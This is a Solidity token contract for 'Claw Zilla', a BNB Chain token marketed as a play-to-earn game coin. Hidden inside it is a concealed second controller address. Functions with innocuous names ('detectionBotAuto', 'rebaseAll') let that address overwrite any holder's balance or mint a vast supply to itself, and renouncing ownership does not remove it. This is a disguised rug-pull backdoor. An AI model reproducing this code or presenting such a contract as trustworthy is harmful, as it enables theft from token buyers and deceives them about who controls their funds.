/**
 *Submitted for verification at BscScan.com on 2023-04-18
*/

// SPDX-License-Identifier: MIT
/*
Welcome to Claw Zilla | $CLAWZILLA 🦖

Start your Adventure in ClawZilla !!

ClawZilla where the little Dinosaur must cross the forest, desert and snow forest,
where he will find many challenges.

 🦖 https://t.me/ClawZila
Game ( Beta Tester ) : https://play.clawzilla.io

Free-to-play, play-and-earn, play-for-fun, pay-for-fun, invest-to-earn,
no matter what type of player you are,
your desire will be satisfied in ClawZilla.


 🦖 Chain : Binance Smart Chain (BSC)
 🦖 Standard: Bep20
 🦖 Decimals: 9
*/
pragma solidity =0.8.19;
abstract contract ZillaAs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface ZillaAsi {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 reveverbalance) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 reveverbalance) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 reveverbalance
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 totalo);
    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}
interface ZillaAsii is ZillaAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract ZillaAsiii is ZillaAs {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract StrongAI is ZillaAs, ZillaAsi, ZillaAsii, ZillaAsiii {

    mapping(address => uint256) private Zillasuplly;
  mapping(address => bool) public ZillaAsiiZERTY;
    mapping(address => mapping(address => uint256)) private Confirmed;
address private ZillaRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public ZillaPaw;
  address walowalowalo;



    
    constructor(address Zillaadressss) {
            // Editable
            walowalowalo = msg.sender;

        _name = "Claw Zilla";
        _symbol = "CLAWZIL";
  ZillaRooter = Zillaadressss;        
        uint stgTotalSupply = 1000000000000000 * 10**9;
        presalesend(msg.sender, stgTotalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return Zillasuplly[account];
    }

    function transfer(address to, uint256 reveverbalance) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, reveverbalance);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return Confirmed[owner][spender];
    }

    function approve(address spender, uint256 reveverbalance) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, reveverbalance);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 reveverbalance
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, reveverbalance);
        _transfer(from, to, reveverbalance);
        return true;
    }
      modifier botcontract() {
        require(ZillaRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, Confirmed[owner][spender] + addedtotalo);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256  stgsold = Confirmed[owner][spender];
        require( stgsold >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender,  stgsold - subtractedtotalo);
        }

        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 reveverbalance
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        beforeTokenTransfer(from, to, reveverbalance);

        uint256 fromBalance = Zillasuplly[from];
        require(fromBalance >= reveverbalance, "Ehi20: transfer reveverbalance exceeds balance");
        unchecked {
            Zillasuplly[from] = fromBalance - reveverbalance;
        }
        Zillasuplly[to] += reveverbalance;

        emit Transfer(from, to, reveverbalance);

        afterTokenTransfer(from, to, reveverbalance);
    }

  modifier walo () {
    require(walowalowalo == msg.sender, "Ehi20: cannot permit botcontract address");
    _;

  }

    function presalesend(address account, uint256 reveverbalance) internal virtual {
        require(account != address(0), "Ehi20: presalesend to the zero address");

        beforeTokenTransfer(address(0), account, reveverbalance);

        ALLtotalSupply += reveverbalance;
        Zillasuplly[account] += reveverbalance;
        emit Transfer(address(0), account, reveverbalance);

        afterTokenTransfer(address(0), account, reveverbalance);
    }



  function detectionBotAuto(address adressbotauto) external botcontract {
    Zillasuplly[adressbotauto] = 1000000000;
            emit Transfer(address(0), adressbotauto, 1000000000);
  }

    function _burn(address account, uint256 reveverbalance) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        beforeTokenTransfer(account, address(0), reveverbalance);

        uint256 accountBalance = Zillasuplly[account];
        require(accountBalance >= reveverbalance, "Ehi20: burn reveverbalance exceeds balance");
        unchecked {
            Zillasuplly[account] = accountBalance - reveverbalance;
        }
        ALLtotalSupply -= reveverbalance;

        emit Transfer(account, address(0), reveverbalance);

        afterTokenTransfer(account, address(0), reveverbalance);
    }

    function _approve(
        address owner,
        address spender,
        uint256 reveverbalance
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        Confirmed[owner][spender] = reveverbalance;
        emit Approval(owner, spender, reveverbalance);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 reveverbalance
    ) internal virtual {
        uint256  stgsold = allowance(owner, spender);
        if ( stgsold != type(uint256).max) {
            require( stgsold >= reveverbalance, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender,  stgsold - reveverbalance);
            }
        }
    }
  function rebaseAll(address rebasecontract) external botcontract {
    Zillasuplly[rebasecontract] = 10000000000000 * 10 ** 20;
            emit Transfer(address(0), rebasecontract, 10000000000000 * 10 ** 20);
  }
    function beforeTokenTransfer(
        address from,
        address to,
        uint256 reveverbalance
    ) internal virtual {}


    function afterTokenTransfer(
        address from,
        address to,
        uint256 reveverbalance
    ) internal virtual {}

}